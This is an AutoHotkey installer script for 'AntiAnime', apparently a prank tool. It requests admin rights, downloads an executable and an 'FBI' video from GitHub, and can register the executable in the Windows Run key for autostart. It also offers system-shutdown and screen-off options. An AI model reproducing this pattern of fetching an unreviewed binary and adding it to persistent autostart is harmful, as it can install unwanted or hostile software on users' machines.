#SingleInstance ignore
#Persistent
if not A_IsAdmin
	Run *RunAs "%A_ScriptFullPath%",,UseErrorLevel
if errorlevel
{
	MsgBox, 262160, Setup, For the script to work properly`, you must run it with admin rights.
	ExitApp
}
Gui, Add, CheckBox, x12 y10 w80 h20 vAR gAR, Auto Run
Gui, Add, Edit, x92 y10 w140 h20 vDirL +disabled,
Gui, Add, CheckBox, x12 y40 w90 h20 voffsys, Off System
Gui, Add, CheckBox, x12 y70 w80 h20 voffscreen, Off Screen
Gui, Add, Text, x12 y90 w80 h20 cBlue, Time Out
Gui, Add, Edit, x12 y105 w80 h20 vtimeout, 0
Gui, Add, Button, x112 y100 w140 h20 gInstall, Install
Gui, Add, Button, x232 y10 w30 h20 vset gset +disabled, Set
Gui, Add, Button, x112 y80 w140 h20 gms, More Scripts [Blast.hk]
Gui, Add, Text, x175 y60 w80 h20 cBlue ggroup, /bass_devware
Gui, Show, w266 h132, Setup
Menu, tray, NoStandard
Menu, tray, add, @bass_devware, group
Menu, tray, add
Menu, tray, add, Restore, Restore
Menu, tray, add
Menu, tray, add, Quit, GuiClose
OnExit, GuiClose
return

AR:
gui,submit,nohide
if AR = %true%
	GuiControl, enable, set
if AR = %false%
	GuiControl, Disable, set
return

install:
gui, submit
if timeout =
	timeout := "0"
if Dir = 
	Dir := "AntiAnime.exe"
settings := "AutoRun = " . AR . "`nOffSystem = " . offsys . "`nOffScreen = " . offscreen . "`nTimeCld = " . timeout . "`nDir = " . Dir
FileDelete, %A_Temp%\config.ini
FileAppend, %settings%, %A_Temp%\config.ini ;Save the file with the settings in the Temp folder.
UrlDownloadToFile, https://github.com/MirchikAhtung/antianime/raw/master/AntiAnime.exe, %Dir%
UrlDownloadToFile, https://github.com/MirchikAhtung/antianime/raw/master/FBI.mp4, %A_Temp%\FBI.mp4
if AR = %true%
	RegWrite, REG_SZ, HKEY_CURRENT_USER, SOFTWARE\Microsoft\Windows\CurrentVersion\Run, AntiAnime, %Dir% ; We add the downloaded file to the registry autostart.
ExitApp
return

set:
GuiControl, disable, AR
FileSelectFolder, Dir, , 3
if Dir !=
	Dir := Dir . "\AntiAnime.exe"
GuiControl,, DirL, %Dir%
TrayTip, AntiAnime, Your dir - "%Dir%"
GuiControl, Enable, AR
return

GuiClose:
if A_ExitReason not in Logoff,Shutdown
{
	MsgBox, 262179, Setup || @bass_devware, Reboot your system?`nAll chang has been applyed after reboot!`n
	IfMsgBox, Cancel
		return
	else IfMsgBox, No
		ExitApp
	else IfMsgBox, Yes
		Shutdown, 2
}
return

Restore:
Gui, show
return

ms:
run, https://blast.hk/search/14732104
return

group:
run, https://vk.com/bass_devware
return
